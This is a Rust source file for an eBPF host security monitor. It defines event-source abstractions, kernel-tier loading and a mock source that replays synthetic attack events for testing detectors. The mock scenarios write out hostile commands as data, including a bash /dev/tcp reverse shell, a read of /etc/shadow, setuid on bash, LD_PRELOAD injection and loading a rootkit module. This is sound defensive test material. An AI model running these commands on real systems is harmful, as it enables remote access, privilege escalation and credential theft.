//! 事件源抽象,统一eBPF ring buffer、mock、文件回放的数据获取接口。
//!
//! trait用async(next_bytes返回Future,避免perfbuf/inotify阻塞tokio reactor);不要求Sync(RingBuf是Send非Sync,强加会逼出Mutex<RingBuf>损失性能);用SourceKind enum做运行时多态与日志区分。

use anyhow::Result;
use async_trait::async_trait;
use ks_core::event::{af, EventHeader, ExecEvent, FileEvent, NetEvent, SignalEvent};

/// 事件源种类。
///
/// 跟多tier eBPF架构对应:Modern(5.8+ ringbuf)、Legacy(4.x perfbuf)、Ancient(3.10+ BTF backport)。Mock和FileReplay用于测试与离线分析。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SourceKind {
    /// 现代eBPF tier,5.8以上,用BPF_MAP_TYPE_RINGBUF
    EbpfModern,
    /// Legacy eBPF tier,4.x,用BPF_MAP_TYPE_PERF_EVENT_ARRAY
    EbpfLegacy,
    /// Ancient eBPF tier,3.10.0-1160以上BTF backport,HASH加手动LRU
    EbpfAncient,
    /// Ancient NOBTF tier,3.10 stock内核无BTF,aya无法加载,由C loader sidecar(ks_loader --stream子进程)加载.o文件,Rust父进程从stdout读帧
    EbpfAncientNoBtf,
    /// Legacy NOBTF tier,4.19原版和麒麟V10 SP1-SP2无BTF,aya加载带BTF的legacy .o时BTF_BTF_LOAD返回EINVAL;改走C loader加载剥离BTF.ext的legacy_nobtf .o,硬编码4.19 offset
    EbpfLegacyNoBtf,
    /// Mock回放,测试演示CI用
    Mock,
    /// 文件回放,离线pcap/jsonl日志重放,未来扩展
    FileReplay,
}

impl SourceKind {
    pub fn as_str(&self) -> &'static str {
        match self {
            SourceKind::EbpfModern => "eBPF-Modern (5.8+ ringbuf)",
            SourceKind::EbpfLegacy => "eBPF-Legacy (4.x perfbuf)",
            SourceKind::EbpfAncient => "eBPF-Ancient (3.10+ BTF backport)",
            SourceKind::EbpfAncientNoBtf => "eBPF-Ancient (NOBTF, C loader sidecar)",
            SourceKind::EbpfLegacyNoBtf => "eBPF-Legacy (NOBTF, 4.19 C loader)",
            SourceKind::Mock => "Mock 回放",
            SourceKind::FileReplay => "文件回放",
        }
    }
}

/// 统一事件源trait。
///
/// 设计上Send不Sync:RingBuf<MapData>是Send非Sync,强加Sync会逼出Mutex<RingBuf>包装每次lock损失性能,本架构每事件源由单task独占持有,删Sync安全。next_bytes是async,perfbuf和FileReplay可能要await epoll/AsyncFd,trait一开始就async避免后续破坏性改动。
#[async_trait]
pub trait EventSource: Send {
    /// 取下一条事件字节。Ok(None)表示暂无数据,不是错误,调用方应sleep。
    async fn next_bytes(&mut self) -> Result<Option<Vec<u8>>>;

    /// 来源种类,用于运行时多态与日志展示。
    fn kind(&self) -> SourceKind;

    /// 人类可读描述,含tier、ringbuf名等细节。
    fn description(&self) -> &str;

    /// 是否为mock,用于跳过告警上报等。
    fn is_mock(&self) -> bool {
        matches!(self.kind(), SourceKind::Mock)
    }

    /// 自身及父进程链pid豁免集合,只有eBPF tier才有,mock和perf返回空。
    /// 用户态检测(baseline/ML/anomaly)跳过这些pid,避免哨兵消费变忙时自指误报。
    fn protected_pids(&self) -> &[u32] {
        &[]
    }
}

// Mock事件源

pub struct MockEventSource {
    events: Vec<Vec<u8>>,
    cursor: usize,
    loop_mode: bool,
}

impl MockEventSource {
    pub fn new_with_all_scenarios() -> Self {
        let base_ns: u64 = 100_000_000_000;
        let mut events = Vec::new();
        events.extend(Self::reverse_shell_scenario(base_ns));
        events.extend(Self::ransomware_scenario(base_ns + 60_000_000_000));
        events.extend(Self::privilege_escalation_scenario(
            base_ns + 120_000_000_000,
        ));
        events.extend(Self::dns_tunnel_scenario(base_ns + 180_000_000_000));
        events.extend(Self::rootkit_scenario(base_ns + 240_000_000_000));
        events.extend(Self::baseline_scenario(base_ns + 300_000_000_000));
        Self {
            events,
            cursor: 0,
            loop_mode: true,
        }
    }

    pub fn new_with_scenario(scenario: MockScenario) -> Self {
        let base_ns: u64 = 100_000_000_000;
        let events = match scenario {
            MockScenario::ReverseShell => Self::reverse_shell_scenario(base_ns),
            MockScenario::Ransomware => Self::ransomware_scenario(base_ns),
            MockScenario::PrivilegeEscalation => Self::privilege_escalation_scenario(base_ns),
            MockScenario::DnsTunnel => Self::dns_tunnel_scenario(base_ns),
            MockScenario::Rootkit => Self::rootkit_scenario(base_ns),
            MockScenario::Baseline => Self::baseline_scenario(base_ns),
            MockScenario::All => Self::new_with_all_scenarios().events,
        };
        Self {
            events,
            cursor: 0,
            loop_mode: false,
        }
    }

    pub fn with_loop(mut self, loop_mode: bool) -> Self {
        self.loop_mode = loop_mode;
        self
    }
    pub fn remaining(&self) -> usize {
        self.events.len() - self.cursor
    }

    fn reverse_shell_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, 1234, base_ns, b"bash", 59),
                filename: make_cstr_256("/bin/bash"),
                args: make_cstr_512("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            }),
            encode_struct(&NetEvent {
                header: make_header(20, 1234, base_ns + 100_000_000, b"bash", 42),
                saddr: ipv4_to_u32("192.168.1.100"),
                daddr: ipv4_to_u32("10.0.0.1"),
                sport: 54321,
                dport: 4444,
                proto: 6,
                family: af::AF_INET,
                saddr6: [0u8; 16],
                daddr6: [0u8; 16],
                _pad3: [0u8; 2],
            }),
            encode_struct(&FileEvent {
                header: make_header(10, 1234, base_ns + 200_000_000, b"cat", 2),
                filename: make_cstr_256("/etc/shadow"),
                bytes: 0,
                fd: 3,
                flags: 0,
            }),
            encode_struct(&make_header(2, 1234, base_ns + 300_000_000, b"bash", 0)),
        ]
    }

    fn ransomware_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 5678;
        let mut events = vec![encode_struct(&ExecEvent {
            header: make_header(1, pid, base_ns, b"encryptor", 59),
            filename: make_cstr_256("/tmp/encryptor"),
            args: make_cstr_512("/tmp/encryptor --target /home/user/docs"),
        })];
        for (i, fname) in [
            "report.pdf.encrypted",
            "budget.xlsx.encrypted",
            "img001.jpg.encrypted",
            "img002.jpg.encrypted",
        ]
        .iter()
        .enumerate()
        {
            events.push(encode_struct(&FileEvent {
                header: make_header(
                    12,
                    pid,
                    base_ns + (i as u64 + 1) * 50_000_000,
                    b"encryptor",
                    1,
                ),
                filename: make_cstr_256(fname),
                bytes: 102400,
                fd: (i + 3) as i32,
                flags: 1,
            }));
        }
        for (i, fname) in ["report.pdf", "budget.xlsx", "img001.jpg", "img002.jpg"]
            .iter()
            .enumerate()
        {
            events.push(encode_struct(&FileEvent {
                header: make_header(
                    13,
                    pid,
                    base_ns + (i as u64 + 5) * 50_000_000,
                    b"encryptor",
                    87,
                ),
                filename: make_cstr_256(fname),
                bytes: 0,
                fd: 0,
                flags: 0,
            }));
        }
        events.push(encode_struct(&FileEvent {
            header: make_header(12, pid, base_ns + 500_000_000, b"encryptor", 1),
            filename: make_cstr_256("README_FOR_DECRYPT.txt"),
            bytes: 2048,
            fd: 11,
            flags: 1,
        }));
        events
    }

    fn privilege_escalation_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 3456;
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, pid, base_ns, b"chmod", 59),
                filename: make_cstr_256("/bin/chmod"),
                args: make_cstr_512("chmod +s /bin/bash"),
            }),
            encode_struct(&FileEvent {
                header: make_header(15, pid, base_ns + 100_000_000, b"chmod", 15),
                filename: make_cstr_256("/bin/bash"),
                bytes: 0,
                fd: 0,
                flags: 0,
            }),
            encode_struct(&FileEvent {
                header: make_header(12, pid, base_ns + 200_000_000, b"bash", 1),
                filename: make_cstr_256("/etc/sudoers"),
                bytes: 256,
                fd: 3,
                flags: 1,
            }),
            encode_struct(&ExecEvent {
                header: make_header(1, pid + 1, base_ns + 300_000_000, b"bash", 59),
                filename: make_cstr_256("/bin/bash"),
                args: make_cstr_512("LD_PRELOAD=/tmp/malicious.so /bin/su"),
            }),
            encode_struct(&SignalEvent {
                header: make_header(30, pid, base_ns + 400_000_000, b"strace", 101),
                target_pid: 1,
                signal: 0,
            }),
        ]
    }

    fn dns_tunnel_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 7890;
        let dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "8.8.8.8", "8.8.4.4"];
        let mut events = vec![encode_struct(&ExecEvent {
            header: make_header(1, pid, base_ns, b"dnstunnel", 59),
            filename: make_cstr_256("/tmp/dnstunnel"),
            args: make_cstr_512("dnstunnel --client"),
        })];
        for (i, dns) in dns_servers.iter().enumerate() {
            events.push(encode_struct(&NetEvent {
                header: make_header(
                    24,
                    pid,
                    base_ns + (i as u64 + 1) * 1_000_000_000,
                    b"dnstunnel",
                    0,
                ),
                saddr: ipv4_to_u32("192.168.1.100"),
                daddr: ipv4_to_u32(dns),
                sport: 12345 + i as u16,
                dport: 53,
                proto: 17,
                family: af::AF_INET,
                saddr6: [0u8; 16],
                daddr6: [0u8; 16],
                _pad3: [0u8; 2],
            }));
        }
        events
    }

    fn rootkit_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 9999;
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, pid, base_ns, b"insmod", 59),
                filename: make_cstr_256("/sbin/insmod"),
                args: make_cstr_512("insmod /tmp/rootkit.ko"),
            }),
            encode_struct(&FileEvent {
                header: make_header(10, pid, base_ns + 100_000_000, b"insmod", 2),
                filename: make_cstr_256("/proc/kallsyms"),
                bytes: 0,
                fd: 3,
                flags: 0,
            }),
            encode_struct(&FileEvent {
                header: make_header(12, pid, base_ns + 200_000_000, b"bash", 1),
                filename: make_cstr_256("/boot/grub/grub.cfg"),
                bytes: 4096,
                fd: 4,
                flags: 1,
            }),
            encode_struct(&SignalEvent {
                header: make_header(31, pid, base_ns + 300_000_000, b"bash", 62),
                target_pid: 100,
                signal: 9,
            }),
        ]
    }

    fn baseline_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, 5000, base_ns, b"ls", 59),
                filename: make_cstr_256("/bin/ls"),
                args: make_cstr_512("ls -la /home"),
            }),
            encode_struct(&FileEvent {
                header: make_header(10, 5001, base_ns + 50_000_000, b"cat", 2),
                filename: make_cstr_256("/etc/hosts"),
                bytes: 0,
                fd: 3,
                flags: 0,
            }),
            encode_struct(&ExecEvent {
                header: make_header(1, 5002, base_ns + 100_000_000, b"wget", 59),
                filename: make_cstr_256("/usr/bin/wget"),
                args: make_cstr_512("wget https://example.com/pkg.tar.gz"),
            }),
            encode_struct(&NetEvent {
                header: make_header(20, 5002, base_ns + 150_000_000, b"wget", 42),
                saddr: ipv4_to_u32("192.168.1.100"),
                daddr: ipv4_to_u32("93.184.216.34"),
                sport: 54322,
                dport: 443,
                proto: 6,
                family: af::AF_INET,
                saddr6: [0u8; 16],
                daddr6: [0u8; 16],
                _pad3: [0u8; 2],
            }),
        ]
    }
}

#[async_trait]
impl EventSource for MockEventSource {
    async fn next_bytes(&mut self) -> Result<Option<Vec<u8>>> {
        if self.cursor >= self.events.len() {
            if self.loop_mode {
                self.cursor = 0;
            } else {
                return Ok(None);
            }
        }
        let data = self.events[self.cursor].clone();
        self.cursor += 1;
        Ok(Some(data))
    }
    fn kind(&self) -> SourceKind {
        SourceKind::Mock
    }
    fn description(&self) -> &str {
        "mock 事件源（场景回放）"
    }
    fn is_mock(&self) -> bool {
        true
    }
}

// Linux真实事件源(aya ring buffer)
// 注意:LinuxEventSource已简化为stub。真实ring buffer消费在start.rs中通过loader.try_next_event()直接调用,后续由EbpfModernSource替换此stub。

#[cfg(target_os = "linux")]
pub struct LinuxEventSource;

#[cfg(target_os = "linux")]
impl Default for LinuxEventSource {
    fn default() -> Self {
        Self::new()
    }
}

impl LinuxEventSource {
    pub fn new() -> Self {
        Self
    }
}

#[cfg(target_os = "linux")]
#[async_trait]
impl EventSource for LinuxEventSource {
    async fn next_bytes(&mut self) -> anyhow::Result<Option<Vec<u8>>> {
        // stub,真实消费由start.rs绕过此trait直接调loader,后续由EbpfModernSource接管。
        Ok(None)
    }
    fn kind(&self) -> SourceKind {
        SourceKind::EbpfModern
    }
    fn description(&self) -> &str {
        "Linux eBPF (stub)"
    }
    fn is_mock(&self) -> bool {
        false
    }
}

// 辅助函数

fn make_header(event_type: u32, pid: u32, ts: u64, comm: &[u8], nr: i32) -> EventHeader {
    let mut buf = [0u8; 16];
    let len = comm.len().min(16);
    buf[..len].copy_from_slice(&comm[..len]);
    EventHeader {
        event_type,
        _pad1: 0,
        timestamp_ns: ts,
        pid,
        tid: pid,
        uid: if pid < 5000 { 0 } else { 1000 },
        ppid: if pid > 100 { pid / 10 } else { 0 },
        comm: buf,
        syscall_nr: nr,
        _pad2: 0,
        retval: 0,
    }
}

fn make_cstr_256(s: &str) -> [u8; 256] {
    let mut buf = [0u8; 256];
    let len = s.len().min(255);
    buf[..len].copy_from_slice(s.as_bytes());
    buf
}

fn make_cstr_512(s: &str) -> [u8; 512] {
    let mut buf = [0u8; 512];
    let len = s.len().min(511);
    buf[..len].copy_from_slice(s.as_bytes());
    buf
}

fn ipv4_to_u32(addr: &str) -> u32 {
    // 跟内核bpf_probe_read_kernel一致:网络字节序字节直接拷入u32字段,Rust读出是native-endian,用from_ne_bytes匹配内核行为。
    let parts: Vec<u8> = addr
        .split('.')
        .filter_map(|p| p.parse::<u8>().ok())
        .collect();
    if parts.len() == 4 {
        u32::from_ne_bytes([parts[0], parts[1], parts[2], parts[3]])
    } else {
        0
    }
}

fn encode_struct<T: Copy>(s: &T) -> Vec<u8> {
    let size = core::mem::size_of::<T>();
    let mut data = vec![0u8; size];
    // 直接从引用拷贝到Vec,避免*s在栈上产生大结构体副本(ExecEvent约800B)。
    unsafe {
        core::ptr::copy_nonoverlapping(s as *const T as *const u8, data.as_mut_ptr(), size);
    }
    data
}

#[derive(Debug, Clone, Copy)]
pub enum MockScenario {
    ReverseShell,
    Ransomware,
    PrivilegeEscalation,
    DnsTunnel,
    Rootkit,
    Baseline,
    All,
}

// 平台导出

#[cfg(target_os = "linux")]
pub use linux_impl::*;
#[cfg(not(target_os = "linux"))]
pub use mock_only::*;

#[cfg(target_os = "linux")]
mod linux_impl {
    pub use super::{EventSource, MockEventSource, SourceKind};
    use crate::ebpf_perf_source::EbpfPerfSource;
    use crate::ebpf_source::EbpfModernSource;
    use crate::loader::{BpfMapReader, EbpfLoader, MockBpfMapReader};
    use crate::tier_detect::detect_ebpf_tier;
    use std::sync::Arc;

    /// 默认事件源,根据内核版本自动选择eBPF tier。
    ///
    /// 返回元组(Box<dyn EventSource>, Option<Arc<dyn BpfMapReader>>),第二元素是BPF map读取器,加载成功为LinuxBpfMapReader,fallback mock为MockBpfMapReader,供/api/v1/stats端点读map_stats。5.8以上走EbpfModernSource(ringbuf,ks_main_modern.o);4.x走EbpfPerfSource(perfbuf,ks_main_legacy.o);3.10以上走EbpfPerfSource(perfbuf,ks_main_ancient.o);太老或读不到版本时走mock加warning。
    pub async fn default_event_source() -> (Box<dyn EventSource>, Option<Arc<dyn BpfMapReader>>) {
        match detect_ebpf_tier() {
            Some(SourceKind::EbpfModern) => {
                log::info!("[tier-detect] 当前内核支持Modern tier (5.8+ ringbuf)");
                let mut loader = EbpfLoader::new();
                match loader.start_all(SourceKind::EbpfModern).await {
                    Ok(_) => {
                        log::info!(
                            "[tier-detect] eBPF Modern tier加载成功,{}个程序已attach",
                            loader.loaded_probes().len()
                        );
                        // 在move loader到source之前先取map_reader
                        let map_reader = loader.map_reader();
                        return (Box::new(EbpfModernSource::new(loader)), map_reader);
                    }
                    Err(e) => {
                        log::warn!("[tier-detect] Modern tier加载失败: {} - fallback mock", e);
                    }
                }
                (
                    Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
                    Some(Arc::new(MockBpfMapReader)),
                )
            }
            Some(SourceKind::EbpfLegacy) => {
                log::info!("[tier-detect] 当前内核走Legacy tier (4.x perfbuf)");
                let mut loader = EbpfLoader::new();
                match loader.start_all(SourceKind::EbpfLegacy).await {
                    Ok(_) => {
                        log::info!(
                            "[tier-detect] Legacy tier加载成功,{}个程序已attach",
                            loader.loaded_probes().len()
                        );
                        let map_reader = loader.map_reader();
                        return (
                            Box::new(EbpfPerfSource::new(loader, SourceKind::EbpfLegacy)),
                            map_reader,
                        );
                    }
                    Err(e) => {
                        log::warn!("[tier-detect] Legacy tier加载失败: {} - fallback mock", e);
                    }
                }
                (
                    Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
                    Some(Arc::new(MockBpfMapReader)),
                )
            }
            Some(SourceKind::EbpfLegacyNoBtf) => {
                // 4.19原版和麒麟V10 SP1-SP2无BTF,aya加载带BTF的legacy .o会BTF_BTF_LOAD返回EINVAL。
                // 改走CLoaderSource加载剥离BTF.ext的ks_main_legacy_nobtf.o(硬编码4.19 offset)。
                log::info!(
                    "[tier-detect] Legacy tier无BTF,尝试CLoaderSource (ks_loader --stream ks_main_legacy_nobtf.o)"
                );
                match try_cloader_source_legacy().await {
                    Ok((source, map_reader)) => {
                        log::info!("[tier-detect] CLoaderSource (legacy_nobtf)启动成功");
                        return (Box::new(source), map_reader);
                    }
                    Err(e) => {
                        log::warn!(
                            "[tier-detect] CLoaderSource (legacy_nobtf)启动失败: {} - fallback mock",
                            e
                        );
                    }
                }
                (
                    Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
                    Some(Arc::new(MockBpfMapReader)),
                )
            }
            Some(SourceKind::EbpfAncient) => {
                // Ancient加NOBTF路径优先走CLoaderSource(ks_loader --stream子进程)。3.10 stock内核无BTF时aya(依赖libbpf 1.0以上)通常无法加载,改由C loader加载.o并把perfbuf事件按帧写stdout。
                if !crate::tier_detect::btf_available() {
                    log::info!("[tier-detect] Ancient tier无BTF,尝试CLoaderSource (ks_loader --stream)");
                    match try_cloader_source().await {
                        Ok((source, map_reader)) => {
                            log::info!("[tier-detect] CLoaderSource启动成功");
                            return (Box::new(source), map_reader);
                        }
                        Err(e) => {
                            log::warn!(
                                "[tier-detect] CLoaderSource启动失败: {} - fallback aya + mock",
                                e
                            );
                        }
                    }
                }
                // aya加载路径(有BTF,或CLoaderSource失败时fallback)
                log::info!("[tier-detect] 当前内核走Ancient tier (3.10+ BTF backport)");
                let mut loader = EbpfLoader::new();
                match loader.start_all(SourceKind::EbpfAncient).await {
                    Ok(_) => {
                        log::info!(
                            "[tier-detect] Ancient tier加载成功,{}个程序已attach",
                            loader.loaded_probes().len()
                        );
                        let map_reader = loader.map_reader();
                        return (
                            Box::new(EbpfPerfSource::new(loader, SourceKind::EbpfAncient)),
                            map_reader,
                        );
                    }
                    Err(e) => {
                        log::warn!("[tier-detect] Ancient tier加载失败: {} - fallback mock", e);
                    }
                }
                (
                    Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
                    Some(Arc::new(MockBpfMapReader)),
                )
            }
            _ => {
                log::warn!("[tier-detect] 内核版本无法识别或太老,fallback mock");
                (
                    Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
                    Some(Arc::new(MockBpfMapReader)),
                )
            }
        }
    }

    /// 尝试启动CLoaderSource(NOBTF路径),在Ancient tier且内核无BTF时调用:先查找ks_loader二进制(KS_LOADER_PATH覆盖或内嵌static预编释放),再查找ks_main_ancient_nobtf.o(KS_EBPF_DIR覆盖或内嵌字节码释放),然后CLoaderSource::spawn启动子进程返回事件源。
    /// CLoaderSource不持有EbpfLoader,无法提供BpfMapReader(map数据在C loader子进程内,Rust父进程访问不到),返回None,stats端点显示空map_stats(NOBTF是研究性路径,可接受)。
    async fn try_cloader_source() -> anyhow::Result<(
        crate::cloader_source::CLoaderSource,
        Option<Arc<dyn BpfMapReader>>,
    )> {
        // Ancient路径:3.10.0-1160硬编码offset
        try_cloader_source_for("ancient_nobtf").await
    }

    /// Legacy NOBTF路径(4.19无BTF)的CLoaderSource启动。
    async fn try_cloader_source_legacy() -> anyhow::Result<(
        crate::cloader_source::CLoaderSource,
        Option<Arc<dyn BpfMapReader>>,
    )> {
        try_cloader_source_for("legacy_nobtf").await
    }

    /// 参数化CLoaderSource启动,按tier suffix选择.o和release兼容检查。
    async fn try_cloader_source_for(
        tier_suffix: &str,
    ) -> anyhow::Result<(
        crate::cloader_source::CLoaderSource,
        Option<Arc<dyn BpfMapReader>>,
    )> {
        use crate::cloader_source::CLoaderSource;

        // release兼容检查,fail loud,避免wrong offset silent读错字段
        let compat = match tier_suffix {
            "ancient_nobtf" => crate::tier_detect::nobtf_release_compatible(),
            "legacy_nobtf" => crate::tier_detect::legacy_nobtf_release_compatible(),
            other => anyhow::bail!("未知nobtf tier suffix: {}", other),
        };
        if let Err(reason) = compat {
            log::warn!("[cloader] {}", reason);
            anyhow::bail!("{}", reason);
        }

        // 查找ks_loader二进制
        let loader_path = find_ks_loader_binary()?;

        // 查找tier-specific .o
        let object_path = match tier_suffix {
            "ancient_nobtf" => find_ancient_nobtf_object()?,
            "legacy_nobtf" => find_legacy_nobtf_object()?,
            _ => unreachable!(),
        };

        log::info!(
            "[cloader] spawn ks_loader --stream {} (loader={}, obj={})",
            object_path.display(),
            loader_path.display(),
            object_path.display(),
        );

        // spawn CLoaderSource
        let source = CLoaderSource::spawn(
            loader_path.to_str().expect("loader_path非UTF-8"),
            object_path.to_str().expect("object_path非UTF-8"),
        )?;

        // CLoaderSource不持有EbpfLoader,返回None,stats端点显示空map_stats(NOBTF路径可接受)
        Ok((source, None))
    }

    /// 把内嵌字节码释放到临时文件并设权限(单二进制部署:运行时从二进制内释放ks_loader和.o)。
    fn release_to_temp(name: &str, bytes: &[u8], mode: u32) -> anyhow::Result<std::path::PathBuf> {
        use std::io::Write;
        use std::os::unix::fs::PermissionsExt;

        let dir = std::env::var_os("TMPDIR")
            .map(std::path::PathBuf::from)
            .unwrap_or_else(|| std::path::PathBuf::from("/tmp"));
        let path = dir.join(format!("ks-{}-{}.bin", name, std::process::id()));

        let mut f = std::fs::File::create(&path)
            .map_err(|e| anyhow::anyhow!("创建临时文件 {} 失败: {}", path.display(), e))?;
        f.write_all(bytes)
            .map_err(|e| anyhow::anyhow!("写入临时文件 {} 失败: {}", path.display(), e))?;
        drop(f);
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(mode))
            .map_err(|e| anyhow::anyhow!("chmod {} 失败: {}", path.display(), e))?;

        log::debug!(
            "[cloader] 释放内嵌 {} 到 {} ({} bytes, mode {:o})",
            name,
            path.display(),
            bytes.len(),
            mode,
        );
        Ok(path)
    }

    /// 查找ks_loader二进制路径(nobtf C loader),优先级:先看环境变量KS_LOADER_PATH(调试覆盖),再从二进制内嵌的static ks_loader释放到临时文件(单二进制,去gcc/PATH依赖)。
    ///
    /// 内嵌ks_loader由build.rs用gcc -static预编(libelf+libz+libzstd静态链接),可在CentOS 7(glibc 2.17)运行。编译期未预编则返回Err,提示设KS_LOADER_PATH。
    fn find_ks_loader_binary() -> anyhow::Result<std::path::PathBuf> {
        // 环境变量KS_LOADER_PATH(调试覆盖)
        if let Ok(p) = std::env::var("KS_LOADER_PATH") {
            let path = std::path::PathBuf::from(&p);
            if path.is_file() {
                log::debug!("[cloader] ks_loader来自KS_LOADER_PATH={}", path.display());
                return Ok(path);
            }
            log::warn!("[cloader] KS_LOADER_PATH={}但文件不存在,改用内嵌", p);
        }

        // 从二进制内嵌static ks_loader释放到临时文件(0500可执行)
        let bytes = crate::loader::ebpf_objects::ks_loader_static().ok_or_else(|| {
            anyhow::anyhow!(
                "二进制内无内嵌ks_loader(编译期static预编失败);\
                 如需外部指定,设KS_LOADER_PATH环境变量"
            )
        })?;
        release_to_temp("ks_loader", bytes, 0o500)
    }

    /// 查找ks_main_ancient_nobtf.o(NOBTF tier eBPF字节码),优先级:先看环境变量KS_EBPF_DIR加ks_main_ancient_nobtf.o(调试覆盖),再从二进制内嵌字节码释放到临时文件(单二进制,去磁盘.o依赖)。
    fn find_ancient_nobtf_object() -> anyhow::Result<std::path::PathBuf> {
        const OBJ_NAME: &str = "ks_main_ancient_nobtf.o";

        // 环境变量KS_EBPF_DIR(调试覆盖)
        if let Ok(dir) = std::env::var("KS_EBPF_DIR") {
            let p = std::path::PathBuf::from(&dir).join(OBJ_NAME);
            if p.is_file() {
                log::debug!("[cloader] {}来自KS_EBPF_DIR={}", OBJ_NAME, p.display());
                return Ok(p);
            }
            log::warn!(
                "[cloader] KS_EBPF_DIR={}但{}不存在,改用内嵌",
                dir,
                OBJ_NAME,
            );
        }

        // 从二进制内嵌字节码释放到临时文件(0400只读,ks_loader读取即可)
        let bytes =
            crate::loader::ebpf_objects::ebpf_object_for("ancient_nobtf").ok_or_else(|| {
                anyhow::anyhow!(
                    "二进制内无内嵌{}(编译期ancient_nobtf tier未成功编译);\
                     如需外部指定,设KS_EBPF_DIR环境变量",
                    OBJ_NAME,
                )
            })?;
        release_to_temp(OBJ_NAME, bytes, 0o400)
    }

    /// 查找ks_main_legacy_nobtf.o(4.19无BTF路径,C loader加载)。
    fn find_legacy_nobtf_object() -> anyhow::Result<std::path::PathBuf> {
        const OBJ_NAME: &str = "ks_main_legacy_nobtf.o";

        if let Ok(dir) = std::env::var("KS_EBPF_DIR") {
            let p = std::path::PathBuf::from(&dir).join(OBJ_NAME);
            if p.is_file() {
                log::debug!("[cloader] {}来自KS_EBPF_DIR={}", OBJ_NAME, p.display());
                return Ok(p);
            }
            log::warn!(
                "[cloader] KS_EBPF_DIR={}但{}不存在,改用内嵌",
                dir,
                OBJ_NAME,
            );
        }

        let bytes =
            crate::loader::ebpf_objects::ebpf_object_for("legacy_nobtf").ok_or_else(|| {
                anyhow::anyhow!(
                    "二进制内无内嵌{}(编译期legacy_nobtf tier未成功编译);\
                     如需外部指定,设KS_EBPF_DIR环境变量",
                    OBJ_NAME,
                )
            })?;
        release_to_temp(OBJ_NAME, bytes, 0o400)
    }
}

#[cfg(not(target_os = "linux"))]
mod mock_only {
    pub use super::{EventSource, MockEventSource};
    use crate::loader::{BpfMapReader, MockBpfMapReader};
    use std::sync::Arc;

    /// 非Linux平台返回mock事件源加MockBpfMapReader。
    pub async fn default_event_source() -> (Box<dyn EventSource>, Option<Arc<dyn BpfMapReader>>) {
        (
            Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
            Some(Arc::new(MockBpfMapReader)),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::aggregator::EventAggregator;

    #[tokio::test(flavor = "current_thread")]
    async fn test_mock_source_decodable() {
        let mut source = MockEventSource::new_with_all_scenarios().with_loop(false);
        let mut agg = EventAggregator::new(10000);
        let mut n = 0;
        while let Ok(Some(bytes)) = source.next_bytes().await {
            if agg.decode(&bytes).is_ok() {
                n += 1;
            }
        }
        assert!(n > 10);
    }

    #[tokio::test(flavor = "current_thread")]
    async fn test_reverse_shell_scenario() {
        let mut source =
            MockEventSource::new_with_scenario(MockScenario::ReverseShell).with_loop(false);
        let mut agg = EventAggregator::new(10000);
        let mut events = Vec::new();
        while let Ok(Some(bytes)) = source.next_bytes().await {
            if let Ok(e) = agg.decode(&bytes) {
                events.push(e);
            }
        }
        assert_eq!(events.len(), 4);
        assert_eq!(events[1].dport, Some(4444));
    }

    #[test]
    fn test_ipv4_encoding() {
        assert_eq!(ipv4_to_u32("8.8.8.8"), 0x08080808);
        assert_eq!(ipv4_to_u32("10.0.0.1"), u32::from_ne_bytes([10, 0, 0, 1]));
    }
}
